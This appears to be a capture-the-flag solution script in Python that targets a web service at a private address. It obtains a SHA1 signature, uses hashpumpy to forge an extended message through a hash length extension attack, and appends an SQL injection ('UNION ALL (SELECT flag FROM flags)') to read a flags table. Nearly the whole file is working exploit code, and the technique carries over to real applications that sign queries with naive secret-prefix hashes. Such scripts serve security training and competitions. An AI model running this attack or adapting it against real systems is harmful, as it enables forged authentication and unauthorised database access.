#!/usr/bin/env python3

import requests
import hashpumpy
import base64
import re

URL = "http://172.31.176.1:8088"

sig=""
original=""
attack_statement="SELECT name AS `%s` FROM users WHERE users.id < 10"
def try_extend(to_add, keylen):
    #print("Expected", attack_statement%(original+to_add))
    new_sig, new_msg = hashpumpy.hashpump(sig,original,to_add,keylen)
    #print("New sig:", new_sig, "MSG",new_msg)
    params={
            "text":base64.b64encode(new_msg).decode('ASCII'),
            "signature":new_sig,
            "queryNo":"8",
            "debug":True
            }
    r =requests.post(f"{URL}/execute", data=params)
    #print(r)
    #print(r.json())
    m = re.findall(r"(dctf\{[^\}]*\})",r.text)
    if m:
        print(m[0])
        print("OK: flag accessible")
    else:
        print("Error: No flag")

def first_try(q):
    params = {
            "alg":"sha1",
            "text":base64.b64encode(q.encode("ASCII")).decode("ASCII"),
            "debug":True
            }
    r = requests.post(f"{URL}/verify_and_sign_text",data=params)
    #print(r)
    return r.json()
init_dict = first_try("Lara")
sig=init_dict['signature']
original=base64.b64decode(init_dict['trimmedText']).decode("ASCII")
#print(f"{sig}:{original}")
try_extend(" FROM users UNION ALL (SELECT flag FROM flags) UNION ALL SELECT DISTINCT `name", 8)
